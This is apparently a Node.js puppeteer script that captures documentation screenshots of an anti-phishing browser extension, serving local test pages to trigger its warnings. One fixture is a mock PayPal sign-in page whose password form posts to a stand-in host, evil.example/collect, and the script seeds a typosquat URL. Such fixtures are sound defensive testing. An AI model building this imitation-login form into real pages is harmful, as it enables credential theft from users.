/**
 * Captures UI screenshots for the documentation (WorkFlowNote.txt).
 *
 *   node scripts/capture-ui-screenshots.js
 *
 * Produces:
 *   docs/images/block-page.png     - real block screen (headless Chrome)
 *   docs/images/warning-banner.png - real warning banner (headless Chrome)
 *   docs/images/popup-high-risk.png- popup UI, real logic, seeded high-risk tab
 *   docs/images/popup-safe.png     - popup UI, real logic, seeded safe tab
 */

const puppeteer = require('puppeteer-core');
const fs = require('node:fs');
const path = require('node:path');
const http = require('node:http');

const ROOT = path.join(__dirname, '..');
const OUT = path.join(ROOT, 'docs', 'images');

const CHROME = process.env.CHROME_PATH ||
  'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';

const PHISH_QUERY =
  'a=update payment&b=verify identity&c=urgent action required' +
  '&d=suspicious activity&pad=' + 'x'.repeat(40);
const WARN_QUERY =
  'a=limited time&b=click here immediately&pad=' + 'x'.repeat(60);

function startServer() {
  const server = http.createServer((req, res) => {
    const { pathname } = new URL(req.url, 'http://127.0.0.1');
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if (pathname === '/phish.html') {
      res.end('<!DOCTYPE html><html><head><title>PayPal - Sign in</title></head>' +
        '<body><h1>Sign in to your account</h1>' +
        '<form action="http://evil.example/collect"><input type="password" name="pw"><button>Sign in</button></form>' +
        '</body></html>');
    } else if (pathname === '/warn.html') {
      res.end('<!DOCTYPE html><html><head><title>Newsletter</title></head>' +
        '<body><h1>Claim your prize</h1><p>Some promotional content lives here.</p></body></html>');
    } else {
      res.end('<!DOCTYPE html><html><body><h1>ok</h1></body></html>');
    }
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve({ server, port: server.address().port }));
  });
}

/** Seed an analysis + stats for the popup tab through the real background worker. */
async function seedPopupState(worker, popupTabUrl, seedUrl, stats) {
  const tabId = await worker.evaluate(async (u) => {
    const tabs = await chrome.tabs.query({});
    const tab = tabs.find((t) => t.url === u);
    return tab ? tab.id : null;
  }, popupTabUrl);
  if (tabId === null) throw new Error('popup tab not found for seeding');

  await worker.evaluate(
    async (id, url, st) => {
      await chrome.storage.local.set({
        [`analysis_${id}`]: { url, domain: '', riskScore: 0, reasons: [], timestamp: Date.now() },
        stats: st
      });
    },
    tabId,
    seedUrl,
    stats
  );
  return tabId;
}

async function capturePopup(browser, worker, seedUrl, stats, outName, expectText) {
  const page = await browser.newPage();
  await page.setViewport({ width: 380, height: 640 });

  const extId = new URL(worker.url()).hostname;
  const popupUrl = `chrome-extension://${extId}/popup.html`;
  await page.goto(popupUrl, { waitUntil: 'domcontentloaded' });

  await seedPopupState(worker, popupUrl, seedUrl, stats);
  await page.reload({ waitUntil: 'domcontentloaded' });

  await page.waitForFunction(
    () => {
      const el = document.getElementById('status-message');
      const loading = document.getElementById('loading');
      return el && el.textContent.length > 0 && loading.style.display === 'none';
    },
    { timeout: 10000 }
  );

  const status = await page.evaluate(() => ({
    message: document.getElementById('status-message').textContent,
    score: document.getElementById('risk-score').innerText,
    domain: document.getElementById('current-domain').textContent,
    reasons: document.querySelectorAll('.reason').length
  }));

  if (expectText && !status.message.includes(expectText)) {
    console.log(`  ! ${outName}: expected "${expectText}", got "${status.message}" - capturing anyway`);
  }

  await page.screenshot({ path: path.join(OUT, outName) });
  console.log(`  saved ${outName}: ${status.message} ${status.score} @ ${status.domain} (reasons: ${status.reasons})`);
  await page.close();
}

(async () => {
  if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });

  const { server, port } = await startServer();
  const base = `http://127.0.0.1:${port}`;

  const browser = await puppeteer.launch({
    executablePath: CHROME,
    headless: true,
    enableExtensions: [ROOT],
    args: ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage'],
    timeout: 30000
  });

  const swTarget = await browser.waitForTarget(
    (t) => t.type() === 'service_worker',
    { timeout: 20000 }
  );
  const worker = await swTarget.worker();

  // 1) Warning banner (real) - captured before the block test, which adds
  //    127.0.0.1 to the suspicious-domain list for the rest of the session.
  {
    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 420 });
    await page.goto(`${base}/warn.html?${WARN_QUERY}`, { waitUntil: 'domcontentloaded' });
    await page.waitForFunction(
      () => !!document.querySelector('#phishing-warning'),
      { timeout: 15000 }
    );
    await new Promise((r) => setTimeout(r, 400));
    await page.screenshot({ path: path.join(OUT, 'warning-banner.png') });
    console.log('  saved warning-banner.png');
    await page.close();
  }

  // 2) Block page (real)
  {
    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.goto(`${base}/phish.html?${PHISH_QUERY}`, { waitUntil: 'domcontentloaded' });
    await page.waitForFunction(
      () => document.body && document.body.innerText.includes('PHISHING SITE BLOCKED'),
      { timeout: 15000 }
    );
    await new Promise((r) => setTimeout(r, 300));
    await page.screenshot({ path: path.join(OUT, 'block-page.png') });
    console.log('  saved block-page.png');
    await page.close();
  }

  // 3) Popup - high risk (real popup logic, seeded analysis)
  await capturePopup(
    browser,
    worker,
    'http://paypa1-login.com/login',
    { sitesBlocked: 12, threatsDetected: 34, sitesReported: 7 },
    'popup-high-risk.png',
    'High Risk'
  );

  // 4) Popup - safe site
  await capturePopup(
    browser,
    worker,
    'https://github.com/user/repo',
    { sitesBlocked: 0, threatsDetected: 0, sitesReported: 0 },
    'popup-safe.png',
    'Safe Site'
  );

  await browser.close();
  server.close();
  console.log('done.');
})().catch((e) => {
  console.error('CAPTURE ERROR:', e);
  process.exit(1);
});
